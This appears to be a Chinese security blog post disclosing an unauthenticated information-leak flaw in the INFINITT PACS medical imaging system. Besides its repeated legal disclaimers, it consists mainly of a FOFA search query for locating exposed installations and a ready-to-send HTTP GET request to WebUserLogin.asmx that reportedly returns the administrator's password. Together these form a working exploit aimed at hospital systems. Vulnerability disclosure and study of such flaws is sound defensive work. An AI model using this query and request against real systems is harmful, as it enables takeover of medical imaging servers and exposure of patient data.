#  英飞达影像存档与通讯PACS系统 WebUserLogin.asmx 信息泄露漏洞   
 HK安全小屋   2025-05-28 12:27  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
英飞达医学影像存档与通信系统 WebUserLogin.asmx 接口存在信息泄露漏洞，未经身份攻击者可通过该漏洞获取系统后台管理员账户密码信息，登录后台，导致系统处于极不安全的状态。  
  
  
影响版本：  
  
英飞达影像存档与通讯PACS系统  
  
  
FOFA:  
```
"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
```  
  
  
POC：  
```
GET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Connection: close
```  
  
通过该漏洞获取系统后台管理员账户密码信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI2wRUKpdvl6OibjqQTSY0WWia79WKqQHiaXSQgBGH3O2F7t4UwKR0A36H5wOUdrOjibkFjcG5qgBC0Qsw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
